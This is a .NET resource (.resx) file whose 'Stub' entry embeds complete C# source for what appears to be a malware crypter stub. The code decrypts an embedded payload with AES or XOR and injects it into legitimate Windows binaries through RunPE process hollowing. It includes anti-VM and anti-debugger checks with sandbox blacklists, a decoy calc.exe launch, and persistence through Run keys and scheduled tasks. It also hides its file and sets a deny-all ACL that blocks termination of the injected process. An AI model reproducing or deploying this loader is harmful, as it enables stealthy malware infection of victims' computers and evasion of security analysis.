<?xml version="1.0" encoding="utf-8"?>
<root>
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="Stub" xml:space="preserve">
    <value>//#define INSTALL
//#define REGEDIT
//#define SCHTASKS

//#define AES
//#define XOR

//#define ITSELF
//#define REGASM
//#define REGSVCS
//#define ASPNET
//#define MSBUILD



//#define ANTIVM
//#define SLEEP
//#define HIDDEN

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Net;
using System.Linq;

[assembly: AssemblyTitle("#AssemblyProduct")]
[assembly: AssemblyDescription("#AssemblyDescription")]
[assembly: AssemblyCompany("#AssemblyCompany")]
[assembly: AssemblyProduct("#AssemblyProduct")]
[assembly: AssemblyCopyright("#AssemblyCopyright")]
[assembly: AssemblyTrademark("#AssemblyTrademark")]
[assembly: AssemblyFileVersion("#AssemblyMajorVersion" + "." + "#AssemblyMinorVersion" + "." + "#AssemblyBuildPart" + "." + "#AssemblyPrivatePart")]
[assembly: AssemblyVersion("#AssemblyMajorVersion" + "." + "#AssemblyMinorVersion" + "." + "#AssemblyBuildPart" + "." + "#AssemblyPrivatePart")]
[assembly: Guid("#Guid")]
[assembly: ComVisible(false)]

namespace Stub
{
    static class Stub
    {
	
#if ANTIVM
        static string[] blackListedIPS = { "88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50" };
        static string[] blackListedHostname = { "BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH" };
        static string[] blackListedUsername = { "WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl" };
        static string[] blackListedGPU = { "Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер" };
        static string[] blacklistedOS = { "Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter" };
        static string[] blackListedProcesses = { "watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe" };

#endif

#if INSTALL
        public static FileInfo FileName = new FileInfo("[FILENAME]");
        public static DirectoryInfo DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.[SPECIAL]), "[FOLDERNAME]"));
#if REGEDIT
        public static string RegistryName = "[REGEDIT]";
#endif

#if SCHTASKS
        public static string SchtasksName = "[SCHTASKS]";
#endif

#endif
        public static void Main()
        {
		
#if ANTIVM
            CheckSystem();
#endif
		
#if HIDDEN
            string fileloc = Assembly.GetExecutingAssembly().Location;
            File.SetAttributes(fileloc, File.GetAttributes(fileloc) | FileAttributes.Hidden | FileAttributes.System);
#endif

#if INSTALL
            Installer();
#endif
            byte[] bytes = GetResource("[RES]");
            byte[] array = Decrypt(bytes, "[KEY]");

#if SLEEP
            Thread.Sleep([SLEEP]);
#endif

#if ITSELF
            RunPE.Run(Application.ExecutablePath, array, false);
#endif

#if REGASM
            RunPE.Run(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe", array, false);
#endif

#if REGSVCS
            RunPE.Run(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe", array, false);
#endif

#if ASPNET
            RunPE.Run(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe", array, false);
#endif

#if MSBUILD
            RunPE.Run(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe", array, false);
#endif
        }
		
		
#if ANTIVM
        static void CheckSystem()
        {
            RamCheck();
        }
#endif

        public static byte[] GetResource(string file)
        {
            Assembly a = Assembly.GetExecutingAssembly();
            using (Stream resFilestream = a.GetManifestResourceStream(file))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }

        }

        private static byte[] Decrypt(byte[] bytesToBeDecrypted, string key)
        {
#if AES
            return AES_Decrypt(bytesToBeDecrypted, key);
#endif

#if XOR
            return XOR_Decrypt(bytesToBeDecrypted, key);
#endif
        }

#if AES
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, string decKey)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 026, 020, 202, 234, 136, 123, 069, 047 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var passwordBytes = Encoding.UTF8.GetBytes(decKey);
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }
#endif

#if XOR
        private static byte[] XOR_Decrypt(byte[] bytesToBeDecrypted, string key)
        {
            byte[] output = new byte[bytesToBeDecrypted.Length];
            for (int i = 0; i &lt; bytesToBeDecrypted.Length; i++)
            {
                output[i] = (byte)(bytesToBeDecrypted[i] ^ key[i % key.Length]);
            }
            return output;
        }
#endif

#if ANTIVM
        static void IpCheck()
        {
            using (WebClient client = new WebClient())
            {
                string ip = client.DownloadString("http://api.ipify.org/");
                bool isBlacklisted = false;

                foreach (string blacklistedIp in blackListedIPS)
                {
                    if (ip.Equals(blacklistedIp))
                    {
                        isBlacklisted = true;
                        break;
                    }
                }

                if (isBlacklisted)
                {
                    ExitProcess();
                }
                else
                {
                    UsernameCheck();
                }
            }
        }

        static void UsernameCheck()
        {
            string userName = Environment.UserName;
            bool isBlacklisted = false;

            foreach (string blacklistedUser in blackListedUsername)
            {
                if (userName.Equals(blacklistedUser))
                {
                    isBlacklisted = true;
                    break;
                }
            }

            if (isBlacklisted)
            {
                ExitProcess();
            }
            else
            {
                HostnameCheck();
            }
        }


        static void HostnameCheck()
        {
            string hostName = Environment.MachineName;
            bool isBlacklisted = false;

            foreach (string blacklistedHost in blackListedHostname)
            {
                if (hostName.Equals(blacklistedHost))
                {
                    isBlacklisted = true;
                    break;
                }
            }

            if (isBlacklisted)
            {
                ExitProcess();
            }
            else
            {
                BiosCheck();
            }
        }


        static void BiosCheck()
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell";
            startInfo.Arguments = "Get-WmiObject Win32_BIOS | Select-Object -ExpandProperty SMBIOSBIOSVersion";
            startInfo.UseShellExecute = false;
			startInfo.CreateNoWindow = true;
            startInfo.RedirectStandardOutput = true;
            process.StartInfo = startInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            if (output.Contains("Hyper-V"))
            {
                ExitProcess();
            }
            else
            {
                SpeedCheck();
            }
        }

        static void SpeedCheck()
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell";
            startInfo.Arguments = "Get-WmiObject Win32_PhysicalMemory | Select-Object -ExpandProperty Speed";
            startInfo.UseShellExecute = false;
			startInfo.CreateNoWindow = true;
            startInfo.RedirectStandardOutput = true;
            process.StartInfo = startInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            string[] speeds = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string speed in speeds)
            {
                if (speed == "0")
                {
                    ExitProcess();
                }
            }
            GpuCheck();
        }

        static void GpuCheck()
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell";
            startInfo.Arguments = "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name";
            startInfo.UseShellExecute = false;
			startInfo.CreateNoWindow = true;
            startInfo.RedirectStandardOutput = true;
            process.StartInfo = startInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            string[] gpuList = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            bool isBlacklisted = false;

            foreach (string gpu in gpuList)
            {
                foreach (string blacklistedGPU in blackListedGPU)
                {
                    if (gpu.Equals(blacklistedGPU))
                    {
                        isBlacklisted = true;
                        break;
                    }
                }

                if (isBlacklisted)
                {
                    break;
                }
            }

            if (isBlacklisted)
            {
                ExitProcess();
            }
            else
            {
                OsCheck();
            }
        }



        static void OsCheck()
        {
            string osp = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "");
            bool isBlacklisted = false;

            foreach (string os in blacklistedOS)
            {
                if (os.Equals(osp))
                {
                    isBlacklisted = true;
                    break;
                }
            }

            if (isBlacklisted)
            {
                ExitProcess();
            }
            else
            {
                ProcessCheck();
            }
        }

        static void ProcessCheck()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                foreach (string blacklistedProcess in blackListedProcesses)
                {
                    if (process.ProcessName.Equals(blacklistedProcess))
                    {
                        ExitProcess();
                        return;
                    }
                }
            }
        }

        static void RamCheck()
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell";
            startInfo.Arguments = "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory";
            startInfo.UseShellExecute = false;
			startInfo.CreateNoWindow = true;
            startInfo.RedirectStandardOutput = true;
            process.StartInfo = startInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            ulong ramSize;
            if (ulong.TryParse(output, out ramSize))
            {
                ramSize /= 1024 * 1024;
                if (ramSize > 1200)
                {
                    IpCheck();
                }
                else
                {
                    ExitProcess();
                }
            }
        }

        static void ExitProcess()
        {
            Console.WriteLine("Hello World!");
            Console.WriteLine("Starting... calc.exe");
            Process.Start("calc.exe");
            Environment.Exit(0);
        }
#endif

#if INSTALL

        public static void Installer()
        {
            if (!IsInstalled())
            {
                try
                {
                    CreateDirectory();
                    InstallFile();
#if REGEDIT
                    InstallRegistry();
#endif

#if SCHTASKS
                    Schtasks();
#endif
                }
                catch { }
            }
        }

        public static bool IsInstalled()
        {
            if (Application.ExecutablePath == Path.Combine(DirectoryName.FullName, FileName.Name))
                return true;
            else
                return false;
        }

        public static void CreateDirectory()
        {
            if (!DirectoryName.Exists)
                DirectoryName.Create();
        }

        public static void InstallFile()
        {
            string fullPath = Path.Combine(DirectoryName.FullName, FileName.Name);
            if (FileName.Exists)
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (process.MainModule.FileName == fullPath) process.Kill();
                    }
                    catch { }
                }
                File.Delete(fullPath);
                Thread.Sleep(250);
            }
            using (FileStream fs = new FileStream(fullPath, FileMode.Create, FileAccess.Write))
            {
                byte[] b = File.ReadAllBytes(Application.ExecutablePath);
                fs.Write(b, 0, b.Length);
            }
        }

#if REGEDIT
        public static void InstallRegistry()
        {
            Powershell("Remove -ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "';" +
                "New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "' -Value '" + "\"" + Path.Combine(DirectoryName.FullName, FileName.Name) + "\"" + "' -PropertyType 'String'");
        }

        public static void Powershell(string args)
        {
            ProcessStartInfo processStart = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = args,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(processStart);
        }
#endif

#if SCHTASKS
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        private static void Schtasks()
        {
            try
            {
                if (IsAdministrator())
                {
                    Process cmd_proc = new Process
                    {
                        StartInfo = new ProcessStartInfo
                    ("cmd", "/C schtasks /create /tn \\" + SchtasksName + " /tr \"" + Path.Combine(DirectoryName.FullName, FileName.Name) + "\" /st 00:00 /du 9999:59 /sc once /ri 30 /rl HIGHEST /f")
                    };
                    cmd_proc.StartInfo.CreateNoWindow = true;
                    cmd_proc.StartInfo.RedirectStandardError = true;
                    cmd_proc.StartInfo.RedirectStandardOutput = true;
                    cmd_proc.StartInfo.UseShellExecute = false;
                    cmd_proc.Start();


                }
                else
                {
                    Process cmd_proc = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        ("cmd", "/C schtasks /create /tn \\" + SchtasksName + " /tr \"" + Path.Combine(DirectoryName.FullName, FileName.Name) + "\" /st 00:00 /du 9999:59 /sc once /ri 30 /f")
                    };
                    cmd_proc.StartInfo.CreateNoWindow = true;
                    cmd_proc.StartInfo.RedirectStandardError = true;
                    cmd_proc.StartInfo.RedirectStandardOutput = true;
                    cmd_proc.StartInfo.UseShellExecute = false;
                    cmd_proc.Start();
                }
            }
            catch { }
        }
#endif

#endif
    }
#region RunPE Class
    public static class RunPE
    {
        [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode), SuppressUnmanagedCodeSecurity]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        [DllImport("kernel32.dll", EntryPoint = "GetThreadContext"), SuppressUnmanagedCodeSecurity]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);
        [DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext"), SuppressUnmanagedCodeSecurity]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
        [DllImport("kernel32.dll", EntryPoint = "SetThreadContext"), SuppressUnmanagedCodeSecurity]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);
        [DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext"), SuppressUnmanagedCodeSecurity]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory"), SuppressUnmanagedCodeSecurity]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory"), SuppressUnmanagedCodeSecurity]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection"), SuppressUnmanagedCodeSecurity]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
        [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx"), SuppressUnmanagedCodeSecurity]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        [DllImport("kernel32.dll", EntryPoint = "ResumeThread"), SuppressUnmanagedCodeSecurity]
        private static extern int ResumeThread(IntPtr handle);
        [StructLayout(LayoutKind.Sequential, Pack = 2 - 1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 3 - 2)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 18 + 18)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }

        public static bool Run(string path, byte[] data, bool protect)
        {
            for (int I = 1; I &lt;= 5; I++)
                if (HandleRun(path, data, protect)) return true;
            return false;
        }
        private static bool HandleRun(string path, byte[] data, bool protect)
        {
            int readWrite = 0;
            string quotedPath = "#by-unknown";
            StartupInformation si = new StartupInformation();
            ProcessInformation pi = new ProcessInformation();
            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
            try
            {
                if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 2 + 2, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
                int fileAddress = BitConverter.ToInt32(data, 120 / 2);
                int imageBase = BitConverter.ToInt32(data, fileAddress + 26 + 26);
                int[] context = new int[179];
                context[0] = 32769 + 32769;
                if (IntPtr.Size == 8 / 2)
                { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                else
                { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                int ebx = context[41];
                int baseAddress = 1 - 1;
                if (!ReadProcessMemory(pi.ProcessHandle, ebx + 4 + 4, ref baseAddress, 2 + 2, ref readWrite)) throw new Exception();
                if (imageBase == baseAddress)
                    if (NtUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 1 - 1) throw new Exception();
                int sizeOfImage = BitConverter.ToInt32(data, fileAddress + 160 / 2);
                int sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 42 + 42);
                bool allowOverride = false;
                int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 6144 + 6144, 32 + 32);

                if (newImageBase == 0) throw new Exception();
                if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, data, sizeOfHeaders, ref readWrite)) throw new Exception();
                int sectionOffset = fileAddress + 124 * 2;
                short numberOfSections = BitConverter.ToInt16(data, fileAddress + 3 + 3);
                for (int I = 1 - 1; I &lt; numberOfSections; I++)
                {
                    int virtualAddress = BitConverter.ToInt32(data, sectionOffset + 6 + 6);
                    int sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 8 + 8);
                    int pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 40 / 2);
                    if (sizeOfRawData != 1 - 1)
                    {
                        byte[] sectionData = new byte[sizeOfRawData];
                        Buffer.BlockCopy(data, pointerToRawData, sectionData, 2 - 2, sectionData.Length);
                        if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                    }
                    sectionOffset += 120 / 3;
                }
                byte[] pointerData = BitConverter.GetBytes(newImageBase);
                if (!WriteProcessMemory(pi.ProcessHandle, ebx + 16 / 2, pointerData, 2 * 2, ref readWrite)) throw new Exception();
                int addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 80 / 2);
                if (allowOverride) newImageBase = imageBase;
                context[22 + 22] = newImageBase + addressOfEntryPoint;

                if (IntPtr.Size == 2 + 2)
                {
                    if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                }
                else
                {
                    if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                }
                if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
                if (protect) Protect(pi.ProcessHandle);
            }
            catch
            {
                Process p = Process.GetProcessById(Convert.ToInt32(pi.ProcessId));
                p.Kill();
                return false;
            }
            return true;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

        private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor rawSecurityDescriptor)
        {
            byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1 - 1 + 1)];
            rawSecurityDescriptor.GetBinaryForm(array, 0);
            bool flag = !SetKernelObjectSecurity(processHandle, 4, array);
            if (flag)
            {
                throw new Win32Exception();
            }
        }

        private static T InlineAssignHelper&lt;T&gt;(ref T target, T value)
        {
            target = value;
            return value;
        }

        private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
        {
            byte[] array = new byte[0];
            uint bufferSize = new uint();
            GetKernelObjectSecurity(processHandle, 4, array, 0u, ref bufferSize);
            if (bufferSize &lt; 0 || bufferSize &gt; short.MaxValue)
            {
                throw new Win32Exception();
            }

            bool cdt = !GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper&lt;byte[]&gt;(ref array, new byte[checked((int)(unchecked((ulong)bufferSize) - 1UL) + 1 - 1 + 1)]), bufferSize, ref bufferSize);
            if (cdt)
            {
                throw new Win32Exception();
            }
            return new RawSecurityDescriptor(array, 0);
        }

        private static void Protect(IntPtr processHandle)
        {
            RawSecurityDescriptor rawSecurityDescriptor = GetProcessSecurityDescriptor(processHandle);
            rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
            SetProcessSecurityDescriptor(processHandle, rawSecurityDescriptor);
        }

        private enum ProcessAccessRights
        {
            DELETE = 65536,
            ITE_OWNER = 524288,
            PROCESS_ALL_ACCESS = 987135,
            PROCESS_CREATE_PROCESS = 128,
            PROCESS_CREATE_THREAD = 2,
            PROCESS_DUP_HANDLE = 64,
            PROCESS_QUERY_INFORMATION = 1024,
            PROCESS_QUERY_LIMITED_INFORMATION = 4096,
            PROCESS_SET_INFORMATION = 512,
            PROCESS_SET_QUOTA = 256,
            PROCESS_SUSPEND_RESUME = 2048,
            PROCESS_TERMINATE = 1,
            PROCESS_VM_OPERATION = 8,
            PROCESS_VM_READ = 16,
            PROCESS_VM_WRITE = 32,
            READ_CONTROL = 131072,
            STANDARD_RIGHTS_REQUIRED = 983040,
            SYNCHRONIZE = 256,
            WRITE_DAC = 262144
        }
    }

#endregion
}</value>
  </data>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
</root>